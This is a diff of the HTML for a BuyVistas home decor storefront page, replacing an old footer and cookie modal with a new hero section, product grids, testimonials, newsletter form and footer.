-                            <ul class="footer-contact">
-                                <li>
-                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z" /><circle cx="12" cy="10" r="3" /></svg>
-                                    <span>100 Peachtree St NW, Suite 2000<br />Atlanta, GA 30303</span>
-                                </li>
-                                <li>
-                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" /></svg>
-                                    <div>
-                                        <a href="tel:+18690158213">+1-8690-158-2213</a>
-                                        <br /><small style="color:#78716C;">Mon-Fri, 9am-6pm EST</small>
-                                    </div>
-                                </li>
-                                <li>
-                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" /><polyline points="22,6 12,13 2,6" /></svg>
-                                    <a href="mailto:hello@buyvistas.com">hello@buyvistas.com</a>
-                                </li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Bottom Bar -->
-            <div class="footer-bottom">
-                <div class="luxe-container">
-                    <div class="footer-bottom-inner">
-                        <p>&copy; 2024 BuyVistas. All rights reserved.</p>
-                        <div class="footer-payments">
-                            <img src="https://img.icons8.com/color/48/visa.png" alt="Visa" />
-                            <img src="https://img.icons8.com/color/48/mastercard.png" alt="Mastercard" />
-                            <img src="https://img.icons8.com/color/48/amex.png" alt="Amex" />
-                            <span class="cod-badge">COD</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </footer>
-
-        <!-- WhatsApp Button -->
-        <a href="https://wa.me/18690158213" target="_blank" rel="noopener noreferrer" class="whatsapp-float" aria-label="Chat on WhatsApp">
-            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 2 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413Z" /></svg>
-        </a>
-
-    </div>
-    <!-- ===== END of yourWebsiteContent ===== -->
-
-
-    <!-- ============================================================ -->
-    <!-- ======  COOKIE MODAL HTML  ====== -->
-    <!-- ============================================================ -->
-    <div id="cookieModalBox" class="cookie-modal-box">
-        <div id="cookieBackdrop" class="cookie-backdrop"></div>
-        <div id="cookieModal" class="cookie-modal">
-            <div class="cookie-card">
-                <button id="cookieClose" class="cookie-close-btn" aria-label="Close">
-                    <svg viewBox="0 0 15 15" width="24" height="24">
-                        <path d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z" fill="currentColor" />
-                    </svg>
-                </button>
-                <div class="cookie-header">
-                    <span class="cookie-icon">🍪</span>
-                    <h2 class="cookie-title">About cookies</h2>
-                </div>
-                <p class="cookie-text">
-                    We use cookies to provide you with a better user experience.
-                    <strong>“agree”</strong>
-                    By clicking, you agree to our use of cookies.
-                </p>
-                <div class="cookie-btn-group">
-                    <button id="cookieAccept" class="cookie-btn-agree">🍪 agree</button>
-                    <button id="cookieDecline" class="cookie-btn-refuse">refuse</button>
                 </div>
             </div>
         </div>
-    </div>
 
+        <!-- Mobile Menu -->
+        <nav class="mobile-menu" data-mobile-menu>
+            <div class="luxe-container">
+                <a href="index.html">Home</a>
+                <a href="shop.html">Shop</a>
+                <a href="about.html">About</a>
+                <a href="contact.html">Contact</a>
+            </div>
+        </nav>
+    </header>
 
-    <!-- ============================================================ -->
-    <!-- ======  SCRIPTS  ====== -->
-    <!-- ============================================================ -->
+    <main data-testid="home-page">
+        <!-- Hero Section -->
+        <section class="hero-section" data-testid="hero-section">
+            <div class="hero-bg">
+                <img src="https://images.unsplash.com/photo-1677568554453-ae5baf28da6c?w=1600" alt="Elegant living room">
+                <div class="hero-overlay"></div>
+            </div>
+            
+            <div class="luxe-container">
+                <div class="hero-content animate-fade-in-up">
+                    <p class="caption-text">Premium Home Decor</p>
+                    <h1 class="heading-hero">Transform Your Space with Elegant Home Decor</h1>
+                    <p>Discover curated collections that bring warmth, style, and personality to every corner of your home.</p>
+                    <div class="hero-buttons">
+                        <a href="shop.html" class="btn-primary" data-testid="shop-now-btn">
+                            Shop Now
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+                        </a>
+                        <a href="about.html" class="btn-secondary">Our Story</a>
+                    </div>
+                </div>
+            </div>
+        </section>
 
-    <!-- Your existing site scripts -->
+        <!-- Offer Banner -->
+        <section class="offer-banner" data-testid="offer-banner">
+            <div class="luxe-container">
+                <p>
+                    <span class="highlight">FLAT 20% OFF</span> + Free Shipping on all orders above $99 | Use code: <span class="highlight">LUXE20</span>
+                </p>
+            </div>
+        </section>
+
+        <!-- Categories Section -->
+        <section class="section-spacing" data-testid="categories-section">
+            <div class="luxe-container">
+                <div class="text-center mb-12">
+                    <p class="caption-text mb-3">Browse By</p>
+                    <h2 class="heading-section">Shop Categories</h2>
+                </div>
+                
+                <div class="categories-grid" id="categories-grid">
+                    <!-- Categories will be loaded by JS -->
+                </div>
+            </div>
+        </section>
+
+        <!-- Best Sellers -->
+        <section class="section-spacing bg-muted" data-testid="bestsellers-section">
+            <div class="luxe-container">
+                <div style="display: flex; flex-direction: column; gap: 1rem; margin-bottom: 3rem;">
+                    <div style="display: flex; flex-direction: column; gap: 1rem; justify-content: space-between; align-items: flex-start;">
+                        <div>
+                            <p class="caption-text mb-3">Customer Favorites</p>
+                            <h2 class="heading-section">Best Sellers</h2>
+                        </div>
+                        <a href="shop.html" class="btn-ghost" style="margin-top: 1rem;">
+                            View All Products
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+                        </a>
+                    </div>
+                </div>
+                
+                <div class="product-grid" id="bestsellers-grid">
+                    <!-- Bestsellers will be loaded by JS -->
+                </div>
+            </div>
+        </section>
+
+        <!-- USP Section -->
+        <section class="section-spacing" data-testid="usp-section">
+            <div class="luxe-container">
+                <div class="usp-grid">
+                    <div class="feature-card">
+                        <div class="feature-card-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="3" width="15" height="13"></rect><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon><circle cx="5.5" cy="18.5" r="2.5"></circle><circle cx="18.5" cy="18.5" r="2.5"></circle></svg>
+                        </div>
+                        <h3>Free Shipping</h3>
+                        <p>Free delivery on orders above $99</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-card-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                        </div>
+                        <h3>Secure Payment</h3>
+                        <p>Cash on Delivery available</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-card-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"></polyline><polyline points="1 20 1 14 7 14"></polyline><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path></svg>
+                        </div>
+                        <h3>Easy Returns</h3>
+                        <p>7-day hassle-free returns</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-card-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 18v-6a9 9 0 0 1 18 0v6"></path><path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path></svg>
+                        </div>
+                        <h3>Support 24/7</h3>
+                        <p>Dedicated customer support</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Testimonials -->
+        <section class="section-spacing bg-muted" data-testid="testimonials-section">
+            <div class="luxe-container">
+                <div class="text-center mb-12">
+                    <p class="caption-text mb-3">What Our Customers Say</p>
+                    <h2 class="heading-section">Testimonials</h2>
+                </div>
+                
+                <div class="testimonials-grid">
+                    <div class="testimonial-card">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="currentColor" style="color: #C5A059; opacity: 0.5; margin-bottom: 1rem;"><path d="M11.192 15.757c0-.88-.23-1.618-.69-2.217-.326-.412-.768-.683-1.327-.812-.55-.128-1.07-.137-1.54-.028-.16-.95.1-1.956.76-3.022.66-1.065 1.515-1.867 2.558-2.403L9.373 5c-.8.396-1.56.898-2.26 1.505-.71.607-1.34 1.305-1.9 2.094s-.98 1.68-1.25 2.69-.346 2.04-.217 3.1c.168 1.4.62 2.52 1.356 3.35.735.84 1.652 1.26 2.748 1.26.965 0 1.766-.29 2.4-.878.628-.576.94-1.365.94-2.368l.002.003zm9.124 0c0-.88-.23-1.618-.69-2.217-.326-.42-.77-.692-1.327-.817-.56-.124-1.074-.13-1.54-.022-.16-.94.09-1.95.75-3.02.66-1.06 1.514-1.86 2.557-2.4L18.49 5c-.8.396-1.555.898-2.26 1.505-.708.607-1.34 1.305-1.894 2.094-.556.79-.97 1.68-1.24 2.69-.273 1-.345 2.04-.217 3.1.168 1.4.62 2.52 1.356 3.35.735.84 1.652 1.26 2.748 1.26.965 0 1.766-.29 2.4-.878.628-.576.94-1.365.94-2.368l-.007.003z"></path></svg>
+                        <p class="testimonial-quote">The quality of the ceramic vases exceeded my expectations. They are now the centerpiece of my living room!</p>
+                        <div class="testimonial-author">
+                            <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=200" alt="Sarah Johnson">
+                            <div class="testimonial-author-info">
+                                <p>Sarah Johnson</p>
+                                <p>Atlanta, GA</p>
+                            </div>
+                            <div class="stars" style="margin-left: auto;">
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="testimonial-card">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="currentColor" style="color: #C5A059; opacity: 0.5; margin-bottom: 1rem;"><path d="M11.192 15.757c0-.88-.23-1.618-.69-2.217-.326-.412-.768-.683-1.327-.812-.55-.128-1.07-.137-1.54-.028-.16-.95.1-1.956.76-3.022.66-1.065 1.515-1.867 2.558-2.403L9.373 5c-.8.396-1.56.898-2.26 1.505-.71.607-1.34 1.305-1.9 2.094s-.98 1.68-1.25 2.69-.346 2.04-.217 3.1c.168 1.4.62 2.52 1.356 3.35.735.84 1.652 1.26 2.748 1.26.965 0 1.766-.29 2.4-.878.628-.576.94-1.365.94-2.368l.002.003zm9.124 0c0-.88-.23-1.618-.69-2.217-.326-.42-.77-.692-1.327-.817-.56-.124-1.074-.13-1.54-.022-.16-.94.09-1.95.75-3.02.66-1.06 1.514-1.86 2.557-2.4L18.49 5c-.8.396-1.555.898-2.26 1.505-.708.607-1.34 1.305-1.894 2.094-.556.79-.97 1.68-1.24 2.69-.273 1-.345 2.04-.217 3.1.168 1.4.62 2.52 1.356 3.35.735.84 1.652 1.26 2.748 1.26.965 0 1.766-.29 2.4-.878.628-.576.94-1.365.94-2.368l-.007.003z"></path></svg>
+                        <p class="testimonial-quote">Fast delivery and excellent packaging. The pendant lights look even better in person. Highly recommend!</p>
+                        <div class="testimonial-author">
+                            <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=200" alt="Michael Chen">
+                            <div class="testimonial-author-info">
+                                <p>Michael Chen</p>
+                                <p>New York, NY</p>
+                            </div>
+                            <div class="stars" style="margin-left: auto;">
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="testimonial-card">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="currentColor" style="color: #C5A059; opacity: 0.5; margin-bottom: 1rem;"><path d="M11.192 15.757c0-.88-.23-1.618-.69-2.217-.326-.412-.768-.683-1.327-.812-.55-.128-1.07-.137-1.54-.028-.16-.95.1-1.956.76-3.022.66-1.065 1.515-1.867 2.558-2.403L9.373 5c-.8.396-1.56.898-2.26 1.505-.71.607-1.34 1.305-1.9 2.094s-.98 1.68-1.25 2.69-.346 2.04-.217 3.1c.168 1.4.62 2.52 1.356 3.35.735.84 1.652 1.26 2.748 1.26.965 0 1.766-.29 2.4-.878.628-.576.94-1.365.94-2.368l.002.003zm9.124 0c0-.88-.23-1.618-.69-2.217-.326-.42-.77-.692-1.327-.817-.56-.124-1.074-.13-1.54-.022-.16-.94.09-1.95.75-3.02.66-1.06 1.514-1.86 2.557-2.4L18.49 5c-.8.396-1.555.898-2.26 1.505-.708.607-1.34 1.305-1.894 2.094-.556.79-.97 1.68-1.24 2.69-.273 1-.345 2.04-.217 3.1.168 1.4.62 2.52 1.356 3.35.735.84 1.652 1.26 2.748 1.26.965 0 1.766-.29 2.4-.878.628-.576.94-1.365.94-2.368l-.007.003z"></path></svg>
+                        <p class="testimonial-quote">I've ordered multiple times from BuyVistas. Consistent quality and beautiful designs every time.</p>
+                        <div class="testimonial-author">
+                            <img src="https://images.unsplash.com/photo-1438761681033-6461ffad8d80?w=200" alt="Emily Davis">
+                            <div class="testimonial-author-info">
+                                <p>Emily Davis</p>
+                                <p>Los Angeles, CA</p>
+                            </div>
+                            <div class="stars" style="margin-left: auto;">
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                                <svg class="star-filled" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- CTA Section -->
+        <section class="cta-section" data-testid="cta-section">
+            <div class="cta-bg">
+                <img src="https://images.unsplash.com/photo-1767720580810-58be50f89bf8?w=1600" alt="Interior">
+                <div class="cta-overlay"></div>
+            </div>
+            
+            <div class="luxe-container">
+                <div class="cta-content">
+                    <h2>Ready to Transform Your Home?</h2>
+                    <p>Explore our complete collection of premium home decor pieces and find the perfect additions to your space.</p>
+                    <a href="shop.html" class="btn-gold">
+                        Explore Collection
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+                    </a>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer" data-testid="main-footer">
+        <!-- Newsletter -->
+        <div class="footer-newsletter">
+            <div class="luxe-container">
+                <div class="footer-newsletter-inner">
+                    <h3>Join the BuyVistas Family</h3>
+                    <p>Subscribe to receive exclusive offers, design tips, and early access to new collections.</p>
+                    <form class="newsletter-form" onsubmit="handleNewsletterSubmit(event)">
+                        <input type="email" placeholder="Enter your email" data-newsletter-email required>
+                        <button type="submit">Subscribe</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Footer -->
+        <div class="footer-main">
+            <div class="luxe-container">
+                <div class="footer-grid">
+                    <!-- Brand -->
+                    <div class="footer-brand">
+                        <h4>
+                            <svg width="28" height="28" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <rect width="40" height="40" rx="4" fill="#C5A059"/>
+                                <path d="M8 20L14 12L20 20L26 12L32 20" stroke="#FFFFFF" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                                <path d="M8 28L14 20L20 28L26 20L32 28" stroke="#FFFFFF" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                            </svg>
+                            BuyVistas
+                        </h4>
+                        <p>Curating exceptional home decor pieces that transform your space into a sanctuary of elegance and comfort.</p>
+                        <div class="footer-social">
+                            <a href="https://instagram.com" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line></svg>
+                            </a>
+                            <a href="https://facebook.com" target="_blank" rel="noopener noreferrer" aria-label="Facebook">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+                            </a>
+                            <a href="https://twitter.com" target="_blank" rel="noopener noreferrer" aria-label="Twitter">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+                            </a>
+                        </div>
+                    </div>
+
+                    <!-- Shop Links -->
+                    <div class="footer-links">
+                        <h5>Shop</h5>
+                        <ul>
+                            <li><a href="shop.html">All Products</a></li>
+                            <li><a href="shop.html?category=Wall%20Art">Wall Art</a></li>
+                            <li><a href="shop.html?category=Lighting">Lighting</a></li>
+                            <li><a href="shop.html?category=Decor">Decor</a></li>
+                            <li><a href="shop.html?category=Furniture">Furniture</a></li>
+                            <li><a href="shop.html?category=Kitchen">Kitchen</a></li>
+                            <li><a href="shop.html?category=Bedroom">Bedroom</a></li>
+                        </ul>
+                    </div>
+
+                    <!-- Company Links -->
+                    <div class="footer-links">
+                        <h5>Company</h5>
+                        <ul>
+                            <li><a href="about.html">About Us</a></li>
+                            <li><a href="contact.html">Contact</a></li>
+                            <li><a href="privacy-policy.html">Privacy Policy</a></li>
+                            <li><a href="terms.html">Terms & Conditions</a></li>
+                            <li><a href="refund-policy.html">Refund Policy</a></li>
+                            <li><a href="shipping-policy.html">Shipping Policy</a></li>
+                        </ul>
+                    </div>
+
+                    <!-- Contact -->
+                    <div class="footer-links">
+                        <h5>Contact Us</h5>
+                        <ul class="footer-contact">
+                            <li>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
+                                <span>100 Peachtree St NW, Suite 2000<br>Atlanta, GA 30303</span>
+                            </li>
+                            <li>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                                <div>
+                                    <a href="tel:+18690158213">+1-8690-158-2213</a>
+                                    <br><small style="color: #78716C;">Mon-Fri, 9am-6pm EST</small>
+                                </div>
+                            </li>
+                            <li>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+                                <a href="mailto:hello@buyvistas.com">hello@buyvistas.com</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bottom Bar -->
+        <div class="footer-bottom">
+            <div class="luxe-container">
+                <div class="footer-bottom-inner">
+                    <p>&copy; 2024 BuyVistas. All rights reserved.</p>
+                    <div class="footer-payments">
+                        <img src="https://img.icons8.com/color/48/visa.png" alt="Visa">
+                        <img src="https://img.icons8.com/color/48/mastercard.png" alt="Mastercard">
+                        <img src="https://img.icons8.com/color/48/amex.png" alt="Amex">
+                        <span class="cod-badge">COD</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- WhatsApp Button -->
+    <a href="https://wa.me/18690158213" target="_blank" rel="noopener noreferrer" class="whatsapp-float" aria-label="Chat on WhatsApp">
+        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 